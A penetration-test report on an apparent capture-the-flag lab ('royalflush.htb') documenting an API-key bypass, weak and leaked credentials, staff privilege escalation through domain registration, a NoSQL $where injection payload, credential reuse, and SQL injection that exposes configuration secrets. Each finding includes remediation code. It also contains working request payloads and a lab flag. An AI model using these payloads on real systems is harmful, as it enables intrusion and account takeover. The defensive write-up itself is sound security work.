```python
def api_key_required(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        if 'key=' not in request.query_string.decode():
            return "Forbidden: Missing API key (parameter 'key')", 403

        api_key = request.args.get('key')

        if api_key == "":
            return "Forbidden: Empty API key", 403

        if api_key and api_key != os.getenv('API_SECRET'):
            return "Forbidden: Incorrect API key", 403

        return f(*args, **kwargs)
    return decorator
```

#### Root Cause Analysis & Exploitation Flow

When an attacker sends a request like `/api/changeUserRole?fkey=123&user_id=1&role_id=2`, the authentication logic breaks down in four steps:

#### 1. Substring Check on Raw Query String



```python
if 'key=' not in request.query_string.decode():
```

The guard inspects the raw URL string for the contiguous character sequence `k-e-y-=`. Passing `fkey=123` satisfies this check because `"key="` exists inside `"fkey="`, so execution continues.

#### 2. Parameter Lookup Mismatch



```python
api_key = request.args.get('key')
```

Flask parses query parameters strictly by exact key name. Because the actual parameter sent was `fkey` and not `key`, `request.args.get('key')` returns `None`.

#### 3. Empty String Check Bypass



```python
if api_key == "":
```

The code checks whether the API key is an empty string (`""`). Because `api_key` is `None` (non-existent parameter) rather than `""` (empty parameter), `None == ""` evaluates to `False`. This check is safely bypassed.

#### 4. Falsy Guard Bypass



```python
if api_key and api_key != os.getenv('API_SECRET'):
```

Because `api_key` is `None` (a falsy value in Python), the logical `AND` condition short-circuits to `False` without evaluating `api_key != os.getenv('API_SECRET')`. The error is skipped entirely, and the request falls through to `return f(*args, **kwargs)`.


#### Security Impact


The breakdown of the `api_key_required` decorator leads to severe, application-wide security risks:

* **Unauthenticated Privilege Escalation:** An attacker can promote any target account (or their own) to the `admin` role (`role_id=2`) without needing valid session credentials or a legitimate `API_SECRET`.
* **Full Account Takeover & Secret Extraction:** By self-escalating to administrator, an attacker gains immediate access to the `/admin` portal, allowing them to extract critical application assets such as `admin_secret`.
* **Mass Account Modification Across Endpoints:** Because the vulnerable `api_key_required` decorator is reused across the API, endpoints like `/api/changeUsername` and `/api/changeUserPassword` suffer from the exact same bypass. An attacker can arbitrarily reset passwords, alter usernames, or hijack any account on the platform.
* **Complete Application Compromise:** Unrestricted access to administrative features and backend parameters results in total data exposure, allowing full disclosure of user data, database contents, and internal environment secrets.


#### Detailed Walkthrough

#### Discovery

During source-code review, the `api_key_required` decorator in `www/__init__.py` was identified as the access-control mechanism for administrative API endpoints.

Closer inspection revealed that the decorator validated the presence of the substring `"key="` in the raw query string, but then retrieved the API key value using `request.args.get('key')`. This mismatch meant that any parameter name containing `"key="` as a substring—such as `fkey`—would satisfy the initial check while causing `request.args.get('key')` to return `None`. Because `None` is falsy, the validation comparison against `API_SECRET` was skipped completely, bypassing the authentication requirement.

#### Exploitation

The target endpoint `/api/changeUserRole` is intended to require a valid API key. To exploit the logic flaw, the following request was crafted without providing a legitimate `key` parameter:



```http
GET /api/changeUserRole?fkey=anything&user_id=<attacker_user_id>&role_id=2 HTTP/1.1
Host: www.royalflush.htb
```




```sql
UPDATE user_roles SET role_id = 2 WHERE user_id = <attacker_user_id>
```

#### Result

The targeted account was successfully promoted to administrator (`role_id = 2`). Upon refreshing the session, the `/admin` dashboard became fully accessible, exposing the entire user directory and revealing the `admin_secret`.

![08 22 22 12](assets/Screenshot-from-2026-08-08-22-22-12.png)

                                                              flag `da3d97b0bc320ac2197b3dd03b6f292a`

![u2COwBHK](assets/edited-u2COwBHK.png)


#### Patching and Remediation

#### Primary Fix — Correct the API Key Validation Logic

The `api_key_required` decorator must check the actual parameter or header value, not a substring of the raw query string. Replace the flawed logic in `www/__init__.py:36-47`.

#### Fix the Existing Query-Parameter Approach

```python
def api_key_required(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        api_key = request.args.get('key')
        if not api_key:
            return "Forbidden: Missing API key", 403
        if api_key != os.getenv('API_SECRET'):
            return "Forbidden: Incorrect API key", 403
        return f(*args, **kwargs)
    return decorator
```

**This ensures:**

* Only a parameter literally named `key` is accepted.
* An empty or missing key returns `403`.
* The value is securely compared against `API_SECRET`.
#### Add Authentication and Authorization to `/api/changeUserRole`

The endpoint must verify that the caller is logged in and has administrative privileges. The API key alone should **not** grant access to role changes.

```python
@app.route('/api/changeUserRole', methods=['POST'])
@login_required
@admin_required
def api_changeUserRole():
    user_id = request.form.get('user_id')
    role_id = request.form.get('role_id')

    if not user_id or not role_id:
        return "Missing parameters", 400

    with db.connect() as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE user_roles SET role_id = %s WHERE user_id = %s', (role_id, user_id))
        conn.commit()

    return "OK"
```

#### Key Changes:

* **`methods=['POST']`**: Role changes are state-modifying actions and must not use `GET`.
* **`@login_required`**: Ensures a valid session exists.
* **`@admin_required`**: Ensures only administrators can modify user roles.

#### Example Decorators:

```python
def login_required(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        token = auth.parse_token(request.cookies.get(auth.cookie_name))
        if not token:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorator

def admin_required(f):
    @wraps(f)
    def decorator(*args, **kwargs):
        token = auth.parse_token(request.cookies.get(auth.cookie_name))
        if not token or not auth.is_admin(token['email']):
            return "Forbidden: Admin access required", 403
        return f(*args, **kwargs)
    return decorator
```

#### Rotate the API Secret

> **Critical Note:** Because the original `API_SECRET` was exposed in version-control history, rotate it immediately in your environment variables and treat the old value as fully compromised.

#### Apply the Same Fix to All API Endpoints

The same authentication bypass affects multiple endpoints:

* `/api/changeUsername` (`www/__init__.py:205`)
* `/api/changeUserPassword` (`www/__init__.py:222`)
* `/api/changeUserRole` (`www/__init__.py:241`)

#### Implementation Standards for Endpoints:

1. Use `POST`, not `GET`.
2. Require a valid user session.
3. Enforce proper authorization checks (IDOR prevention).
4. Accept `user_id` modifications **only from administrators**; normal users should only be permitted to modify their own active account session.

#### Example for Non-Admin User Endpoints:

```python
@app.route('/api/changeUsername', methods=['POST'])
@login_required
def api_changeUsername():
    new_username = request.form.get('username')
    token = auth.parse_token(request.cookies.get(auth.cookie_name))

    if not new_username:
        return "Missing username parameter", 400

    with db.connect() as conn:
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET username = %s WHERE email = %s', (new_username, token['email']))
        conn.commit()

    return "OK"
```



### Leaked credentials charles:charles on forum.royalflush.htb {#28049f2f-465c-4337-ac38-1f4f6bdde7c0}

#### CWE

CWE-200

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N (6.9 - Medium)

#### Affected Component(s)

* https://forum.royalflush.htb

#### External References

* [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)

#### Description & Cause

During initial reconnaissance, public content on the **RoyalFlush forum** was reviewed. A public thread contained a message from an administrator instructing a user named `char***` not to set a password identical to his username.

This public disclosure allowed an unauthenticated attacker to infer the exact account credentials (`char***:char***`). Using these credentials, authentication to the main **RoyalFlush application** was successfully established, leading to an Account Takeover (ATO) of a standard user.

#### Root Causes

1. **Sensitive Information Disclosure (Public Channel)**

   * Application administrators discussed specific credential patterns and username-password compositions in an unauthenticated, publicly indexable forum thread.

2. **Weak Password Policy Enforceability**

   * The core application allowed users to set trivial passwords identical to their usernames, lacking complexity controls or checks against common/predictable passwords.


#### Security Impact

* **Account Takeover (Single User):** Full access to `char***`'s account, allowing authorization to all standard features (e.g., account settings, gameplay).
* **Expanded Attack Surface / Lateral Movement:** While the account holds no administrative privileges (preventing direct access to `/admin` or privileged endpoints), gaining an authenticated state enables post-authentication testing, reply to threads , etc....


#### Detailed Walkthrough

#### Initial Reconnaissance & Credential Disclosure

During the initial reconnaissance phase, public content on the **RoyalFlush forum** (`[http://forum.royalflush.htb](http://forum.royalflush.htb)`) was analyzed. A thread was identified in which an administrator posted a public message advising a user named `char***` not to set his password to be identical to his username.

#### Credential Inference

Based on the explicit disclosure in the public forum thread, the target credentials were inferred as:

* **Username:** `char****`
* **Password:** `char***`

![u7it1eUq](assets/edited-u7it1eUq.png)
#### Exploitation & Verification

1. Navigated to the primary RoyalFlush login portal at `[https://www.royalflush.htb/login](https://www.royalflush.htb/login)`.
2. Submitted the inferred credentials (`char***:char***`).
3. The authentication request was successful, yielding a valid session for the target account.

#### Post-Exploitation & Impact Assessment

* **Access Level:** Successfully authenticated as `char***`.
* **Privilege Level:** Inspection of the session context confirmed the account operates with default standard privileges .
* **Available Functionality:** The access grants interaction only with standard user feature


#### Patching and Remediation

#### Remediation & Mitigation Strategy

#### 1. Immediate Actions

1. **Force Account Password Reset:**

   * Invalidate current session tokens and password hashes for the `char***` account immediately.
   * Require the user to establish a strong, unique password upon next authentication.
   * Dispatch password-reset links via out-of-band, verified channels (e.g., registered email), avoiding public communication platforms.

2. **Content Redaction and Cache Purging:**

   * Delete or redact the specific forum post containing the credential exposure.
   * Audit and clear potential downstream exposure vectors, including local forum archives, search engine caches, and database backups containing the post text.

3. **Historical Exposure Audit:**

   * Perform an automated database search across historical forum threads for keywords such as `password`, `login`, `credentials`, or plain-text patterns.
   * Scrub any secondary sensitive disclosures identified during the sweep.

#### 2. Preventing Weak Passwords

4. **Enforce Strong Password Policies:** Update registration and password-reset controllers to strictly reject weak or predictable input, including passwords matching the username or common dictionary entries.

   ```python
   import re

   def is_password_strong(username, password):
       # Reject short passwords
       if len(password) < 12:
           return False

       # Reject trivial username-password matching
       if password.lower() == username.lower():
           return False

       # Enforce character diversity rules
       if not re.search(r'[A-Z]', password):
           return False
       if not re.search(r'[a-z]', password):
           return False
       if not re.search(r'\d', password):
           return False
       if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
           return False

       return True
   ```


5. **Interactive Strength Indicators:**

   * Implement real-time client-side feedback mechanisms to guide users toward higher-entropy passphrases.

#### 3. Operational Guidance & Process Improvements

6. **Administrative Security Awareness:**

   * Mandate training for administrative and support staff to enforce strict confidential handling of account details.
   * Restrict support communications exclusively to authenticated, encrypted ticketing channels.


#### 4. Technical Hardening

7. **Implement Login Rate Limiting:** Thwart automated credential-stuffing and brute-force attacks by enforcing rate limiting at the API gateway or application layer.

   ```python
   # Example implementation using Flask-Limiter
   from flask_limiter import Limiter

   limiter = Limiter(app=app, key_func=lambda: request.remote_addr)

   @app.route('/login', methods=['POST'])
   @limiter.limit("5 per minute")
   def login():
       # Authentication logic
       pass
   ```


8. **Enforce Multi-Factor Authentication (MFA):**

    * Deploy Time-based One-Time Password (TOTP) or FIDO2/WebAuthn MFA options to prevent unauthorized access even in the event of password compromise.

#### 5. Verification & Remediation Testing

Post-patch verification must confirm the following operational controls:

* **Credential Invalidation:** The `char***:char***` credential pair is rejected by the authentication endpoint.
* **Content Scrubbing:** The public forum thread no longer exposes sensitive user information.
* **Input Validation:** Password update forms actively reject weak patterns (e.g., `password == username`).
* **Rate Limiting:** Excessive consecutive login requests trigger an HTTP `429 Too Many Requests` response.



### No domain restriction at registration {#009c6a45-40b2-44ee-8c6b-769c061549e0}

#### CWE

CWE-269

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N (8.8 - High)

#### Affected Component(s)

* app/Http/Controllers/AuthController.php:18-61  (handleCreateAccount)

#### External References

* [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
* [CWE-269: Improper Privilege Management](https://cwe.mitre.org/data/definitions/269.html)
* [PortSwigger Web Security Academy - Privilege escalation](https://portswigger.net/web-security/access-control)

#### Description & Cause

The application’s authentication logic contains an improper privilege management vulnerability. The registration endpoint permits arbitrary email domain input without validation or domain ownership verification. Simultaneously, `AuthService::isUserStaff()` dynamically evaluates a user's email domain during the login flow and automatically grants staff-level access if the email address ends in `@royalflush.htb`.

Because registration is completely unconstrained, an unauthenticated attacker can register an arbitrary account using the target domain (e.g., `attacker@royalflush.htb`). Upon logging in, the application assigns `isStaff = true` in the user's session, resulting in full horizontal and vertical privilege escalation to staff-level functionalities.

#### Root Causes & Architectural Flaws

#### 1. Missing Registration Domain Validation

In `AuthController.php:handleCreateAccount`, the application accepts and stores user-supplied email input without enforcing domain whitelists, checking user authorization, or requiring administrative pre-approval.



```php
// Unvalidated input assignment in AuthController.php
$email = $request->input('email');
...
$user['email'] = $email;
```

#### 2. Implicit Privilege Assignment Based on Identifier

Staff privileges are assigned strictly via string parsing of the email address rather than relying on explicit, database-backed Role-Based Access Control (RBAC).



```php
// Dynamic role evaluation in AuthService.php
public static function isUserStaff($email) {
    $tk = explode("@", $email);
    return strcmp($tk[1], "royalflush.htb") == 0;
}
```

* **Flaw:** Implicitly trusts user-controllable input (`email`) as an authoritative privilege indicator.
* **Impact:** Any account created with the matching suffix inherits staff permissions immediately.

#### 3. Non-Functional Identity & Domain Verification

While `handleCreateAccount` generates a verification token and `handleLogin` checks `$user['verified'] == true`, the underlying identity verification mechanism fails to validate domain control:

* Outgoing verification emails are disabled/commented out in deployment (`AuthController.php:44-48`).
* The system does not verify whether the registrant possesses an active, legitimate mailbox on the `@royalflush.htb` domain.



#### Security Impact


* **Staff access to the forum** The attacker gains staff privileges, which typically include content moderation, user management, and access to staff-only forum features.
* **Trusted-platform abuse** Staff status makes malicious posts or announcements appear legitimate to regular forum users.
* **Potential phishing and social engineering** An attacker with staff rights can publish content that mimics official RoyalFlush communication.


#### Detailed Walkthrough

#### Source-Code Review

While reviewing the forum source code at `/home/hassan/Desktop/code/forum-main/forum`, the tester examined the account-registration flow in `app/Http/Controllers/AuthController.php` and the staff-check logic in `app/Services/AuthService.php`.


The tester observed that:

1. The registration handler accepts any email address without validating the domain.
2. The `isUserStaff()` function grants staff privileges automatically when the email domain is `royalflush.htb`.

#### Exploitation

To confirm the flaw, the tester navigated to the forum registration page at `[http://forum.royalflush.htb/create-account](http://forum.royalflush.htb/create-account)` and submitted the following registration form:

| **Field**           | **Value**                 |
| ------------------- | ------------------------- |
| **Username**        | `test`                |
| **Email**           | `test@royalflush.htb` |
| **Password**        | `test`       |
| **Repeat Password** | `test`       |

The application processed the request and created the account successfully:

![svnmKRhJ](assets/edited-svnmKRhJ.png)

#### Verification of Staff Status

After completing the email-verification step and logging in with the newly created account, the application executed the login handler:

```php
// app/Http/Controllers/AuthController.php:128-134
session([
    'userId' => $user['id'],
    'username' => $user['username'],
    'email' => $user['email'],
    'isStaff' => AuthService::isUserStaff($user['email'])
]);
```




#### Patching and Remediation

#### Block Self-Registration with Internal Domain

Update `app/Http/Controllers/AuthController.php:handleCreateAccount` to reject any registration attempt using an `@royalflush.htb` email address:



```php
public function handleCreateAccount(Request $request) {
    if ($request->has('username') && $request->has('email') && $request->has('password') && $request->has('repeatPassword')) {
        $username = $request->input('username');
        $email = $request->input('email');
        $password = $request->input('password');
        $repeatPassword = $request->input('repeatPassword');

        // Prevent public registration with internal staff domain
        if (str_ends_with(strtolower($email), '@royalflush.htb')) {
            session()->flash('status', 'Registration with this domain is restricted. Contact an administrator.');
            session()->flash('statusType', 'danger');
            return view('create-account');
        }

        if (strcmp($password, $repeatPassword) === 0) {
            $passwordHash = password_hash($password, PASSWORD_BCRYPT);
            // ...
        }
    }
    // ...
}
```




#### Restrict Staff Account Provisioning

Do not allow public self-registration for staff accounts under any condition. Implement an administrative control flow:

* **Manual Admin Promotion:** An existing administrator explicitly toggles `is_staff = true` after verifying the identity of the user.
* **Invitation-Only Provisioning:** Require staff to register using a cryptographically signed, single-use invitation link generated by an admin.

#### Validate and Sanitize Input

Enforce native Laravel validation rules at the entry point of `handleCreateAccount` to harden input handling:

```php
$request->validate([
    'username' => 'required|unique:users,username|max:50',
    'email'    => 'required|email|unique:users,email',
    'password' => 'required|min:12|confirmed',
]);
```


#### Audit Existing Accounts

* Query the database for all existing accounts containing the `@royalflush.htb` domain.
* Revoke staff access or demote any accounts created through the public registration interface.
* Force a password reset for legitimate staff accounts if unauthorized access or session compromise is suspected.

#### Verification Criteria

* **Domain Restriction:** Registering with `attacker@royalflush.htb` triggers an explicit restriction error and halts account creation.
* **Default Privilege Level:** All newly created users default to `is_staff = false`.
* **Access Control:** Privileged capabilities are strictly reserved for accounts explicitly granted staff status in the database.
* **Abuse Control:** Excess registration requests trigger a `429 Too Many Requests` HTTP response.



### NoSQL Injection at verify-email endpoint forum.royalflush.htb {#b5ce6c43-ed46-4f81-8e44-30a5e758daae}

#### CWE

CWE-943

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N (8.8 - High)

#### Affected Component(s)

* AuthController::showVerifyEmail() in app/Http/Controllers/AuthController.php  (GET /verify-email)

#### External References

* [OWASP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
* [CWE-943: Improper Neutralization of Special Elements in Data Query Logic](https://cwe.mitre.org/data/definitions/943.html)
* [PortSwigger Web Security Academy - NoSQL injection](https://portswigger.net/web-security/nosql-injection)

#### Description & Cause

The /verify-email endpoint is vulnerable to NoSQL injection through MongoDB's \$where operator. When a user clicks an email verification link, the application retrieves the corresponding\
verificationTokens document by building a JavaScript expression from the user-supplied token and email parameters. Because the input is concatenated directly into the expression string\
without sanitization or parameterization, an attacker can inject arbitrary JavaScript into the query. This allows manipulation of the verification logic—most directly, an attacker can\
bypass the token check and verify any unverified account, including accounts they do not own, by forcing the \$where clause to evaluate to true.

Cause

The root cause is unsafe construction of a MongoDB \$where query using sprintf() with raw user input:

```php
  $where = sprintf("return this.token == '%s' && this.userId == '%s'", $token, $user['id']);
  $verificationToken = $verificationTokens_collection->findOne(['$where' => $where]);
```

The application treats token and email as trusted string literals rather than untrusted data. MongoDB's \$where operator executes the supplied string as JavaScript in the database context.

#### Security Impact

**Email Verification Bypass:** The application's only gate for account activation is rendered ineffective. An attacker can activate accounts they do not own.


#### Detailed Walkthrough

#### 1. Source-Code Review

While reviewing `app/Http/Controllers/AuthController.php`, the tester noticed that `showVerifyEmail()` builds a MongoDB `$where` query by concatenating the user-supplied `token` and `email` values directly into a JavaScript expression:

```php
$where = sprintf("return this.token == '%s' && this.userId == '%s'", $token, $user['id']);
$verificationToken = $verificationTokens_collection->findOne(['$where' => $where]);
```

Because `$where` executes the string as JavaScript inside MongoDB, any injected JavaScript alters the query logic. A token value containing `'` breaks out of the string literal, allowing the attacker to rewrite the comparison.

#### 2. Account Creation

The tester registered a new account with an email address under the `royalflush.htb` domain, for example:

Plaintext

```
asd@royalflush.htb
```

> **Note:** This domain is significant because `AuthService::isUserStaff()` grants staff privileges to any user whose email ends in `@royalflush.htb`.

#### 3. Malicious Verification Request

Without using the legitimate verification token sent by email, the tester sent the following request:

HTTP

```
GET /verify-email?email=asd@royalflush.htb&token='||true||''==' HTTP/1.1
Host: royalflush.htb
```

The injected token transforms the `$where` expression from:

```javascript
return this.token == '<token>' && this.userId == '<userId>'
```

into:

```javascript
return this.token == ''||true||''=='' && this.userId == '<userId>'
```

Due to operator precedence and short-circuit evaluation, the expression evaluates to `true`, causing `findOne()` to return the first matching verification token document. The application then treats the request as valid and marks the account as verified.

#### 4. Verification and Access

The application responded with the success message:

> *"Thank you, your email has been successfully verified


![4jinfVYr](assets/edited-4jinfVYr.png)

The tester could now log in to the activated account. Because the email domain was `@royalflush.htb`, the session was created with `isStaff = true`, granting access to staff-only forums and staff-only content across the application.


#### Patching and Remediation

#### 1. Eliminate the `$where` Operator

Do **not** use MongoDB's `$where` operator with any user-controlled input. `$where` executes arbitrary JavaScript inside the database engine and cannot be safely parameterized, making it highly vulnerable to NoSQL Injection (SSJI).

Replace any raw `$where` evaluation with standard Eloquent query-builder lookups that use MongoDB's native comparison operators:



```php
public function showVerifyEmail(Request $request)
{
    $request->validate([
        'email' => 'required|email',
        'token' => 'required|string|alpha_num|size:128',
    ]);

    $email = $request->input('email');
    $token = $request->input('token');

    $user = User::where('email', $email)->first();

    if (!$user) {
        return $this->invalidVerification();
    }

    $verificationToken = VerificationToken::where('userId', $user->id)
        ->where('token', $token)
        ->first();

    if ($verificationToken) {
        $user->update(['verified' => true]);
        $verificationToken->delete(); // One-time use

        session()->flash('status', 'Thank you, your email has been successfully verified');
        session()->flash('statusType', 'success');

        return view('verify-email');
    }

    return $this->invalidVerification();
}

private function invalidVerification()
{
    session()->flash('status', 'Invalid or expired verification link');
    session()->flash('statusType', 'danger');

    return view('verify-email');
}
```

#### 2. Strict Input Validation

Validate and sanitize both `email` and `token` prior to performing database execution.

* Enforce strict typing (`string`, `alpha_num`).
* Require exact string lengths (`size:128`) to neutralize payload injection at the HTTP request layer before reaching MongoDB.

#### 3. One-Time Token Use

Always invalidate or delete the `VerificationToken` document immediately after a successful status change. This prevents token replay attacks and limits exposure if tokens leak via web server access logs or browser history.

#### 4. Token Expiration (TTL Check)

Ensure verification tokens are short-lived. Store a timestamp during token creation and check for expiration against a designated Time-To-Live (e.g., 24 hours):



```php
$verificationToken = VerificationToken::where('userId', $user->id)
    ->where('token', $token)
    ->where('created_at', '>=', now()->subHours(24))
    ->first();
```

Alternatively, leverage MongoDB **TTL Indexes** on the `created_at` field to automatically purge expired documents at the database layer.





### Creds Leak at forum.royalflush.htb {#11975b2f-d6df-4f75-989c-19dd279e2467}

#### CWE

CWE-200

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (8.7 - High)

#### Affected Component(s)

* https://forum.royalflush.htb/thread/2 (staff-only thread)

#### External References

* [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
* [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)

#### Description & Cause

The application contains private, staff-only forum threads that are intended for internal administrative discussions. However, these threads are being used to share plaintext account credentials, including password resets.

Because the threads are readable by any staff or admin user (and by anyone who gains staff-level access), the credentials are exposed within the privileged boundary. An attacker who compromises or elevates to a staff account can read these private threads, extract the leaked password and related identity information, and reuse them to access other internal services such as `vault.royalflush.htb`.

#### Root Cause

The issue is not that regular users can view the threads—the threads are properly restricted to staff/admin users. The root cause is that plaintext credentials are being stored and transmitted through a multi-user staff channel:

1. **No secure channel for password reset delivery**

   `AuthController::handleLostPassword()` generates a random password, but the `mail()` call is commented out. As a result, the password is never delivered securely to the user's email:

   ```php
   try {
       // mail(
       //     $user['email'],
       //     'RoyalFlush Forum Password Reset',
       //     'Your password has been reset. It is now:\n' . $newPassword
       // );
   } catch (Exception $e) {}
   ```

   With the intended delivery path broken, staff resort to sharing the new password inside the staff-only thread.

2. **Plaintext credential sharing in staff threads**

   The staff-only thread contains a post with the plaintext password `42zyTJ94BwdKjE******` and another post with the user's contact handle (`jdov****#0066`). The application stores this content in cleartext in the `posts` collection and renders it to every staff member who can access the thread.

3. **No input filtering or data-loss prevention**

   `ThreadController::handlePost()` accepts the `content` parameter and saves it directly into a new `Post` document without inspecting it for patterns such as passwords, API keys, email addresses, or tokens:

   ```php
   $content = $request->input('content');
   $post = new Post();
   $post['threadId'] = $id;
   $post['userId'] = session()->get('userId');
   $post['content'] = $content;
   $post->save();
   ```



#### Security Impact


The exposure of plaintext credentials within staff-only threads leads to the following high-severity security impacts:

* **Account Takeover of the Affected User** An attacker who can read the staff-only thread obtains the plaintext password (`42zyTJ94BwdKjE******`) and the user's associated email address (`jdov****@royalflush.htb`). With these credentials, the attacker can authenticate as the user and gain unauthorized access to any internal or external service where the same credentials are valid.
* **Compromise of Internal Administrative Services** The leaked credentials were successfully reused against `vault.royalflush.htb`. Because the compromised account belongs to an administrator/staff member, the attacker gains direct access to sensitive internal vaults, restricted documentation, and administrative controls.


#### Detailed Walkthrough

#### 1. Browsing Staff-Only Threads

After gaining staff-level access to the forum, review the private staff threads. In `thread/2`, a password-reset conversation is exposed in plaintext:

Plaintext

```
john: Like the question says, how can I access the team slack? I got logged out and realized I don't remember the password lul
admin: The password is in Vault.
john: Ahhhh okay.. what if I don't remember my password for vault either?
admin: Mmmm alright, I'll have will change your password

![08 18 58 23](assets/Screenshot-from-2026-08-08-18-58-23.png)
will: Hi John! I just reset you password to `42zyTJ94BwdKjEw******`. Your email is still the same one as here. Make sure you change it once you log in.
john: Thx, will do <3
```

![APokibAN](assets/edited-APokibAN.png)


#### 2. Collecting Leaked Credentials

From this thread, extract the exposed sensitive data:

* **Username:** `john`
* **Password:** `42zyTJ94BwdKjE******`
* **Note:** Confirmation from `admin` that the user's email address matches the forum registration.

#### 3. Enumerating the Target Email Address

Reviewing `thread/4` reveals another post where the same user shared his Discord handle while offering administrative support:

Plaintext

```
roverturbo: How can I change my email? I don't use this one for much anymore
john: Hi, we have not implemented this functionality yet. But if you message me privately I can change it for you. Discord: jdov****#0066
roverturbo: Ok I messaged you
```


![IdDwVJ73](assets/edited-IdDwVJ73.png)

From the Discord handle `jdov****#0066`, infer the username `jdov****` and construct the associated corporate email address:

Plaintext

```
jdov****@royalflush.htb
```

#### 4. Credential Reuse Against Internal Vault

Navigate to `[https://vault.royalflush.htb](https://vault.royalflush.htb)` and authenticate using the extracted credentials:

Plaintext

```
Email:    jdov****@royalflush.htb
Password: 42zyTJ94BwdKjE******
```

The application accepts the credentials, granting full access to the vault under John's account and confirming account takeover via information leaked in internal staff threads.


#### Patching and Remediation

1. Fix and enable secure password reset delivery
      Do not share plaintext passwords in forum threads. Uncomment and properly configure the mail() call in AuthController::handleLostPassword(), or better, use Laravel's Mail facade with
      a proper mail driver:

      ```php
        use Illuminate\Support\Facades\Mail;
        use App\Mail\PasswordResetMail;

        $newPassword = AuthService::generateRandomString(16);
        $newPasswordHash = password_hash($newPassword, PASSWORD_BCRYPT);
        $user->update(['password' => $newPasswordHash]);

        Mail::to($user->email)->send(new PasswordResetMail($newPassword));
      ```

      Alternatively, switch to a time-limited, single-use password reset link instead of emailing a plaintext temporary password.

   2. Use password reset tokens instead of plaintext passwords
      Generate a cryptographically random token, store its hash in the database with an expiration timestamp, and email the user a link such as:

      ```
        https://forum.royalflush.htb/reset-password?token=<random_token>
      ```

      This removes the need for staff to ever see or transmit a user's password.

   3. Create a secure support channel for sensitive requests
      Do not handle password resets in shared staff threads. Implement a private ticket system, direct-message feature, or out-of-band communication workflow (e.g., verified email or
      internal chat) where only the affected user and the assigned staff member can view the sensitive details.

   4. Enforce password change on first login
      If a temporary password must be issued, set a flag forcing the user to change it immediately upon login. Store the flag in the user record and redirect to a password-change form
      before allowing normal use.

   5. Monitor and audit staff threads
      Implement logging and alerting for posts containing potential secrets. Regularly audit staff-only threads for exposed credentials and rotate any leaked credentials immediately.




### SQL Injection at Vault.royalflush.htb {#3d54335f-b7d9-4631-b09e-78cdc0d306a8}

#### CWE

CWE-89

#### CVSS 4.0

CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (9.4 - Critical)

#### Affected Component(s)

* MyController.SecondaryEmail() in Controllers/MyController.cs

#### External References

* https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet

#### Description & Cause

The Vault application's backup-email update feature is vulnerable to SQL injection. When a logged-in user submits a new secondary email address, the application checks whether the email is already in use by running a `SELECT` query. The user-supplied value is inserted directly into the SQL command string using `string.Format()`, and the preceding regex validation is weak enough to be bypassed. As a result, an attacker can inject arbitrary SQL into the query.

Because the backend uses Microsoft SQL Server and the connection is configured with database credentials, a successful injection can be escalated to dump arbitrary tables, extract sensitive records (such as stored passwords and user data), and read files from the underlying server using SQL Server primitives such as `OPENROWSET(BULK...)`, `xp_dirtree`, or error-based file reads.

#### Root Cause

The root cause is unsafe dynamic SQL construction combined with ineffective input validation:

1. **User input concatenated into SQL**

   In `MyController.SecondaryEmail()`, the secondary email value is embedded directly into the query string:



   ```C#
   cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
   ```

   Because there are no query parameters, any single quote (`'`) in the input terminates the string literal and alters the query's syntax and semantics.

2. **Bypassable regex validation**

   The validation pattern is configured as:



   ``` C#
   string emailPattern = @"\S+@[a-z\.]+";
   ```

   Because it is not anchored with `^` and `$`, the `\S+` pattern permits quotes, comment markers, and SQL keywords as long as the payload ends with an `@domain.tld`-style substring. For example, `' OR 1=1--@x.com` successfully passes validation while executing injected SQL.

3. **Inconsistent parameterization**

   Although other methods within the same controller correctly utilize `SqlParameter`, this specific lookup relies on `string.Format()`, completely bypassing SQL Server's parameterization and escaping defenses.

4. **High-privilege database context**

   The connection string initialized in `DbService.GetConnectionString()` uses a dedicated SQL account with privileges sufficient to read database contents and access server files. This context elevates the impact from simple data disclosure to file-system traversal.


#### Security Impact

The SQL injection in `/My/SecondaryEmail` runs in the context of Microsoft SQL Server and exposes file-system error messages, the impact escalates to full application compromise:

* **Database extraction** The attacker can dump the entire Vault database, including all user records, password hashes, and the contents of the Passwords table. This exposes every secret the application is meant to protect.
* **System file read** Through `OPENROWSET(BULK...)` and error-based file probing, the attacker can read arbitrary files from the web server. In this case, the `Web.config` file was successfully extracted.
* **Authentication bypass via forged JWT cookies** The dumped `Web.config` contains the `AuthKey` value `874c2f91-7346-4005-****-*******`, which is used by `AuthService` as the symmetric signing key for JWT authentication cookies. With this key, an attacker can forge valid user cookies for any account, including administrators, without needing a password.
* **Decryption of stored passwords** The same `Web.config` exposes `PasswordKey` (`f3d9aa53-c08d-43`) and `PasswordIV` (`5ac8083e-8ff6-43`), which are used by `PasswordService` to encrypt and decrypt password entries. An attacker with these values can decrypt every stored password in the Passwords table, exposing all user-managed secrets in plaintext.
